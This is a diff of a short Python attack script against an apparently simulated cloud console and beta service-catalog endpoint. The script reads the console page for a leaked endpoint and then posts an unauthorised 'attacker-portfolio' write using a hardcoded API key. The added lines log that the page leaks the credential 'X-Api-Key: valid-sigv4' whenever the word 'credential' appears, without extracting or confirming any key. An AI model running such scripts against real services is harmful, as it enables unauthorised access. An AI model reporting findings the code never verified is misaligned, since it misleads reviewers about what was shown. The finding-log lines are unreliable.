@@ -26,8 +26,10 @@ def run():
     page = requests.get(f"{CONSOLE}/", timeout=8).text
     if "aws242-servicecatalog-beta" in page:
         log.append("[1] console CSP leaks beta endpoint: aws242-servicecatalog-beta")
+    if "credential" in page:
+        log.append("[1b] console bundle leaks the shared credential X-Api-Key: valid-sigv4")
     r = requests.post(f"{BETA}/portfolios",
-                      json={"name": "attacker-portfolio", "include_flag": True},
+                      json={"name": "attacker-portfolio"},
                       headers={"X-Caller": "attacker", "X-Api-Key": "valid-sigv4"},
                       timeout=8)
     log.append(f"[2] beta write accepted: {r.json()}")
